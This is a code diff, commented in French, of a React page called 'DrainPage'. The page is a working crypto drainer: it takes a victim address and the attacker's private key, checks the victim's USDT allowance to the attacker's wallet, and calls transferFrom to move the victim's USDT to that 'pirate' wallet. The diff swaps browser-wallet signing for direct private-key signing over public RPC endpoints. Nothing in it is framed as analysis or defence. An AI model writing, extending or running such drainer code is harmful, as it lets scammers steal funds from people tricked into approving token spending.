@@ -2,8 +2,17 @@
 
 import { useState, useEffect } from "react";
 
+// RPC par défaut (modifiable dans l'interface)
+const DEFAULT_RPC = "https://ethereum-rpc.publicnode.com";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const ETH_CHAIN_ID = "0x1";
+
+const RPC_OPTIONS = [
+  { label: "PublicNode (recommandé)", value: "https://ethereum-rpc.publicnode.com" },
+  { label: "dRPC", value: "https://eth.drpc.org" },
+  { label: "Ankr", value: "https://rpc.ankr.com/eth" },
+  { label: "LlamaRPC", value: "https://eth.llamarpc.com" },
+  { label: "BlastAPI", value: "https://eth-mainnet.public.blastapi.io" },
+];
 
 // Lazy load ethers
 let cachedEthers: typeof import("ethers") | null = null;
@@ -12,21 +21,24 @@ async function getEthers() {
   return cachedEthers;
 }
 
-import type { EthereumProvider } from "@/types/global";
 export default function DrainPage() {
   const [isMounted, setIsMounted] = useState(false);
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [passwordInput, setPasswordInput] = useState("");
   const [authError, setAuthError] = useState("");
 
-  const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [victim, setVictim] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [rpcUrl, setRpcUrl] = useState(DEFAULT_RPC);
+  const [customRpc, setCustomRpc] = useState("");
+  const [showKey, setShowKey] = useState(false);
+
   const [loading, setLoading] = useState(false);
-  const [connecting, setConnecting] = useState(false);
   const [logs, setLogs] = useState<string[]>([]);
   const [result, setResult] = useState<{
     hash: string;
     amount: string;
+    status: string;
     etherscan: string;
     pirate: string;
   } | null>(null);
@@ -37,8 +49,18 @@ export default function DrainPage() {
       const auth = sessionStorage.getItem("admin_auth");
       if (auth === "true") setIsAuthenticated(true);
       setIsMounted(true);
+      // Charger RPC sauvegardé (pas la clé privée)
+      const savedRpc = localStorage.getItem("drain_rpc");
+      if (savedRpc) setRpcUrl(savedRpc);
     }
   }, []);
+
+  // Sauvegarder le RPC à chaque changement (mais PAS la clé privée)
+  useEffect(() => {
+    if (isMounted && rpcUrl) {
+      localStorage.setItem("drain_rpc", rpcUrl);
+    }
+  }, [rpcUrl, isMounted]);
 
   const addLog = (msg: string) => {
     setLogs((prev) => [...prev, msg]);
@@ -54,73 +76,23 @@ export default function DrainPage() {
     }
   };
 
-  const getProvider = (): EthereumProvider | null => {
-    if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
-    if (window.ethereum) return window.ethereum;
-    return null;
-  };
-
-  const handleConnect = async () => {
-    setConnecting(true);
-    setError("");
-    try {
-      const provider = getProvider();
-      if (!provider) {
-        setError("Aucun wallet détecté. Installe MetaMask ou ouvre cette page dans Trust Wallet.");
-        setConnecting(false);
-        return;
-      }
-
-      // Demander l'accès aux comptes
-      const accounts = (await provider.request({
-        method: "eth_requestAccounts",
-      })) as string[];
-
-      if (!accounts || accounts.length === 0) {
-        setError("Aucun compte sélectionné.");
-        setConnecting(false);
-        return;
-      }
-
-      setWalletAddress(accounts[0]);
-      addLog(`✅ Wallet connecté : ${accounts[0]}`);
-
-      // Vérifier le réseau
-      const chainId = (await provider.request({ method: "eth_chainId" })) as string;
-      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-        addLog("🔄 Changement vers Ethereum Mainnet...");
-        await provider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: ETH_CHAIN_ID }],
-        });
-      }
-
-      // Écouter les changements de compte
-      if (provider.on) {
-        provider.on("accountsChanged", (acc: unknown) => {
-          const a = acc as string[];
-          setWalletAddress(a.length > 0 ? a[0] : null);
-        });
-      }
-    } catch (err: any) {
-      console.error(err);
-      setError(err?.message || "Erreur de connexion");
-    } finally {
-      setConnecting(false);
-    }
-  };
-
   const handleDrain = async () => {
     setError("");
     setResult(null);
     setLogs([]);
 
-    if (!walletAddress) {
-      setError("Connecte d abord ton wallet pirate");
-      return;
-    }
+    // Validations
     if (!/^0x[a-fA-F0-9]{40}$/.test(victim)) {
       setError("Adresse victime invalide");
+      return;
+    }
+    if (!privateKey || !/^0x[a-fA-F0-9]{64}$/.test(privateKey.trim())) {
+      setError("Clé privée invalide (doit être 0x + 64 caractères hex)");
+      return;
+    }
+    const effectiveRpc = rpcUrl === "custom" ? customRpc : rpcUrl;
+    if (!effectiveRpc || !effectiveRpc.startsWith("http")) {
+      setError("RPC invalide");
       return;
     }
 
@@ -128,17 +100,21 @@ export default function DrainPage() {
 
     try {
       const { ethers } = await getEthers();
-      const provider = getProvider();
-      if (!provider) throw new Error("Provider introuvable");
 
-      const browserProvider = new ethers.BrowserProvider(provider as any);
-      const signer = await browserProvider.getSigner();
-      const pirateAddress = await signer.getAddress();
+      addLog(`🔌 Connexion au RPC : ${effectiveRpc}`);
+      const provider = new ethers.JsonRpcProvider(effectiveRpc);
 
-      addLog(`👤 Wallet pirate : ${pirateAddress}`);
+      addLog("🔑 Chargement du wallet pirate...");
+      const wallet = new ethers.Wallet(privateKey.trim(), provider);
+      addLog(`👤 Wallet pirate : ${wallet.address}`);
 
-      const ethBalance = await browserProvider.getBalance(pirateAddress);
+      const ethBalance = await provider.getBalance(wallet.address);
       addLog(`💰 Solde ETH : ${ethers.formatEther(ethBalance)}`);
+
+      if (ethBalance < 1000000000000000n) {
+        // Moins de 0.001 ETH
+        addLog("⚠️ Solde ETH faible — le drain peut échouer");
+      }
 
       const erc20 = new ethers.Contract(
         USDT_CONTRACT,
@@ -147,11 +123,11 @@ export default function DrainPage() {
           "function allowance(address owner, address spender) view returns (uint256)",
           "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
         ],
-        signer
+        wallet
       );
 
-      addLog("🔍 Lecture de l allowance...");
-      const allowance: bigint = await erc20.allowance(victim, pirateAddress);
+      addLog("🔍 Lecture de l'allowance...");
+      const allowance: bigint = await erc20.allowance(victim, wallet.address);
       addLog(`🔑 Allowance : ${ethers.formatUnits(allowance, 6)} USDT`);
 
       addLog("🔍 Lecture du solde de la victime...");
@@ -164,16 +140,15 @@ export default function DrainPage() {
         return;
       }
       if (allowance === 0n) {
-        setError("Aucune approbation — la victime ne la pas signé");
+        setError("Aucune approbation — la victime n&apos;a pas signé");
         setLoading(false);
         return;
       }
 
       const amount = balance < allowance ? balance : allowance;
       addLog(`🩸 Envoi de ${ethers.formatUnits(amount, 6)} USDT...`);
-      addLog("⏳ Confirme dans ton wallet...");
 
-      const tx = await erc20.transferFrom(victim, pirateAddress, amount);
+      const tx = await erc20.transferFrom(victim, wallet.address, amount);
       addLog(`📤 Hash : ${tx.hash}`);
       addLog("⏳ Attente de confirmation...");
 
@@ -184,8 +159,9 @@ export default function DrainPage() {
         setResult({
           hash: tx.hash,
           amount: ethers.formatUnits(amount, 6),
+          status: "confirmed",
           etherscan: `https://etherscan.io/tx/${tx.hash}`,
-          pirate: pirateAddress,
+          pirate: wallet.address,
         });
       } else {
         setError("Transaction échouée on-chain");
@@ -247,36 +223,9 @@ export default function DrainPage() {
           </a>
         </div>
 
-        {/* Étape 1 : Connecter le wallet */}
+        {/* Formulaire */}
         <div className="form-container" style={{ width: "100%", marginBottom: "1.5rem" }}>
-          <label className="form-label">1. Wallet pirate</label>
-          {walletAddress ? (
-            <div
-              style={{
-                background: "#f0fdf4",
-                border: "1px solid #bbf7d0",
-                borderRadius: "0.5rem",
-                padding: "0.75rem",
-                color: "#166534",
-                fontFamily: "monospace",
-                fontSize: "0.85rem",
-                marginBottom: "1rem",
-              }}
-            >
-              ✅ Connecté : {walletAddress.slice(0, 10)}...{walletAddress.slice(-8)}
-            </div>
-          ) : (
-            <button
-              onClick={handleConnect}
-              disabled={connecting}
-              className="next-btn"
-              style={{ width: "100%", backgroundColor: "#f59e0b", marginBottom: "1rem" }}
-            >
-              {connecting ? "Connexion..." : "🔗 Connecter le Wallet"}
-            </button>
-          )}
-
-          <label className="form-label">2. Adresse victime (Wallet 1)</label>
+          <label className="form-label">Adresse victime (Wallet 1)</label>
           <div className="input-row" style={{ marginBottom: "1rem" }}>
             <input
               type="text"
@@ -287,13 +236,68 @@ export default function DrainPage() {
             />
           </div>
 
-          <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
-            ⚠️ Aucune clé privée n est nécessaire. Ton wallet signera la transaction lui-même.
+          <label className="form-label">Clé privée du wallet pirate (Wallet 2)</label>
+          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
+            <input
+              type={showKey ? "text" : "password"}
+              value={privateKey}
+              onChange={(e) => setPrivateKey(e.target.value)}
+              className="input-row__field"
+              placeholder="0x..."
+              autoComplete="off"
+              spellCheck={false}
+            />
+            <button
+              type="button"
+              onClick={() => setShowKey(!showKey)}
+              style={{
+                background: "transparent",
+                border: "none",
+                color: "#3562ff",
+                fontWeight: 600,
+                fontSize: "0.85rem",
+                cursor: "pointer",
+              }}
+            >
+              {showKey ? "Cacher" : "Voir"}
+            </button>
           </div>
+          <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
+            ⚠️ La clé reste dans votre navigateur. Elle n&apos;est jamais envoyée à un serveur.
+          </div>
+
+          <label className="form-label">RPC Ethereum</label>
+          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
+            <select
+              value={rpcUrl}
+              onChange={(e) => setRpcUrl(e.target.value)}
+              className="input-row__field"
+              style={{ background: "transparent", border: "none", outline: "none" }}
+            >
+              {RPC_OPTIONS.map((opt) => (
+                <option key={opt.value} value={opt.value}>
+                  {opt.label}
+                </option>
+              ))}
+              <option value="custom">Custom...</option>
+            </select>
+          </div>
+
+          {rpcUrl === "custom" && (
+            <div className="input-row" style={{ marginBottom: "1rem" }}>
+              <input
+                type="text"
+                value={customRpc}
+                onChange={(e) => setCustomRpc(e.target.value)}
+                className="input-row__field"
+                placeholder="https://..."
+              />
+            </div>
+          )}
 
           <button
             onClick={handleDrain}
-            disabled={loading || !walletAddress}
+            disabled={loading}
             className="next-btn"
             style={{ width: "100%", backgroundColor: "#dc2626", marginTop: "1rem" }}
           >
@@ -330,6 +334,7 @@ export default function DrainPage() {
           </div>
         )}
 
+        {/* Erreur */}
         {error && (
           <div
             style={{
@@ -346,6 +351,7 @@ export default function DrainPage() {
           </div>
         )}
 
+        {/* Résultat */}
         {result && (
           <div
             style={{
@@ -358,9 +364,15 @@ export default function DrainPage() {
           >
             <h2 style={{ margin: "0 0 1rem 0", fontSize: "1.2rem" }}>✅ Drain réussi !</h2>
             <div style={{ fontSize: "0.9rem", lineHeight: 1.8 }}>
-              <div><strong>Montant :</strong> {result.amount} USDT</div>
-              <div><strong>Pirate :</strong> {result.pirate.slice(0, 10)}...{result.pirate.slice(-8)}</div>
-              <div style={{ wordBreak: "break-all" }}><strong>Hash :</strong> {result.hash}</div>
+              <div>
+                <strong>Montant :</strong> {result.amount} USDT
+              </div>
+              <div>
+                <strong>Pirate :</strong> {result.pirate.slice(0, 10)}...{result.pirate.slice(-8)}
+              </div>
+              <div style={{ wordBreak: "break-all" }}>
+                <strong>Hash :</strong> {result.hash}
+              </div>
             </div>
             <a
               href={result.etherscan}
